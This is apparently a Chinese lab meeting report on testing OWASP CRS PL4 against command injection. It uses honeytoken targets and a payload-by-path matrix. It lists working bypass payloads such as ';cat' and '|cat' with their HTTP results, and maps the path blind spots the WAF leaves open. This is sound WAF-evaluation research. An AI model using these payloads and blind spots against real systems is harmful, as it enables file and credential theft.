# 例会报告 W1：样本有效性 — 从 flag.txt 到蜜标梯度矩阵

> 周期：第一周 | 场景：CMDi / SQLi / Upload

---

## 问题的演进

### 阶段一：发现 WAF 盲区

**做了什么**：跑批量攻击，CMDi L1-L4 全部绕过 CRS PL4 拿到 flag。

```
;cat /flag.txt    → 200 ✅  WAF放行
|cat /flag.txt    → 200 ✅  WAF放行
||cat /flag.txt   → 200 ✅  WAF放行
```

**追问**：`cat` 在 CRS PL4 的 RCE 规则里吗？

查了 CRS 的 REQUEST-932 规则文件——Unix 命令黑名单只有 `whoami` 等侦察命令，`cat` 不在其中。WAF 不认为读取一个叫 `flag.txt` 的文件是威胁。

**结论**：**flag.txt 无效。** WAF 放行不是因为检测弱，是因为目标太假。

---

### 阶段二：设计蜜标方案

**核心矛盾**：

| 需求 | 冲突 |
|------|------|
| 需要唯一标记验证攻击成功 | 标记不能出现在 payload 里 |
| 目标要像真实资产 | 但不能是真的敏感文件 |
| 要覆盖多个攻击面 | 不能到处撒 flag |

**方案**：嵌入式蜜标 `hp-[0-9a-f]{8}`，只存在于目标内部。

```
payload:  ;cat /app/config/db.php        ← WAF视角：攻击配置文件
目标内容: define('DB_PASS', 'Kx9m...'); ← 像真实密码
          // deployment_id: hp-4f8a2c1b  ← 蜜标(注释中)
```

验证逻辑改成匹配 `hp-[0-9a-f]{8}` 正则。

---

### 阶段三：正交矩阵 + 两阶段探测

**把"怎么打"和"打什么"拆成两个独立维度**：

```
              │  P0 系统文件   │  P1 应用配置   │  P2 无害路径
──────────────┼───────────────┼───────────────┼──────────────
;cat          │     测         │      测        │      测
|cat          │     测         │      测        │      测
||cat         │     测         │      测        │      测
$(cat)        │     测         │      测        │      测
```

**两阶段探测 (Probe-then-Scale)**：

先跑 36 次探针判断哪种语法被拦，再只为干净语法展开全矩阵。被拦语法直接跳过，节省 60%+ 成本。

**三角定位归因**：两个不同无害目标（`id` / `env`）互相验证，消掉内容干扰，确定 WAF 拦的是语法还是路径。

---

### 阶段四：发现梯度是假的

**第一个蜜标矩阵全部用 `/app/config/` 路径。测试结果：**

```
;cat /app/config/db.php    → 200 绕过
;cat /app/config/.env      → 200 绕过
;cat /app/logs/app.log     → 200 绕过
```

全放行。横轴的"敏感度梯度"是我们自己编的标签——WAF 对 `/app/` 下的所有路径一视同仁。

**追问**：WAF 到底对哪些路径敏感？

---

### 阶段五：探测真实 WAF 路径敏感度

**用 `;cat` 这个已验证绕过的分隔符，只变目标路径，测试真实系统路径：**

| 路径 | HTTP | 结论 |
|------|------|------|
| `/etc/passwd` | 403 | /etc/* 全部被拦 |
| `/etc/shadow` | 403 | |
| `/etc/hostname` | 403 | |
| `/etc/motd` | 403 | |
| `/proc/version` | 403 | /proc/* 全部被拦 |
| `/var/www/html/.env` | 403 | /var/www/* 全部被拦 |
| `/var/log/syslog` | 403 | /var/log/* 全部被拦 |
| `/tmp/test` | 403 | /tmp/* 全部被拦 |
| `/opt/app/config.yml` | 403 | config.yml 文件名触发 |
| `/srv/config/db.yml` | **200** | ✅ 安全 |
| `/usr/local/share/db.ini` | **200** | ✅ 安全 |
| `/home/git/repo/config` | **200** | ✅ 安全 |
| `/app/config/db.php` | **200** | ✅ 安全 |

**发现**：CRS PL4 有三层路径检测——`/etc/*` `/proc/*` `/var/www/*` `/var/log/*` `/tmp/*` 全在黑名单。但 `/srv/*` `/usr/local/*` `/home/*` `/app/*` 是盲区。

---

### 阶段六：构建真实梯度

**用 Docker 挂载把蜜标嵌入真实系统路径**：

```yaml
- ./honeytokens/etc_motd:/etc/motd:ro           # P0: WAF一定拦
- ./honeytokens/srv_db.yml:/srv/config/db.yml:ro # P1: WAF可能放
- ./honeytokens/config/db.php:/app/config/db.php:ro # P2: WAF一定放
```

---

## 最终成果：蜜标梯度矩阵

```
═══════════════════════════════════════════════════════════════════
          P0 /etc/motd   P0 /etc/hostname  P1 /srv/config  P1 /usr/local  P2 /app/config
          (WAF应拦)       (WAF应拦)          (WAF可放)        (WAF可放)       (WAF应放)
───────────────────────────────────────────────────────────────────
;         403 正确 ✅      —                  泄露 hp-f8a9     —              泄露 hp-4f8a
|         —               403 正确 ✅          —               泄露 hp-e5f6   泄露 hp-e9a1
||        —               403 正确 ✅          —               —              泄露 hp-4f8a
$()       403 正确 ✅      —                  —               —              200 无蜜标
═══════════════════════════════════════════════════════════════════
```

**三个核心发现：**

1. **P0 全拦** — `;` `|` `||` `$()` 在 `/etc/*` 全部 403。WAF 有独立的路径敏感度检测层，与语法检测正交
2. **P1/P2 的 `;` `|` `||` 全绕过** — CRS PL4 对简单分隔符 + 非系统路径的组合存在系统性盲区
3. **`$()` 语法在 P2 无效** — 既不是路径拦截也不是蜜标获取，语法自身导致 payload 执行失败
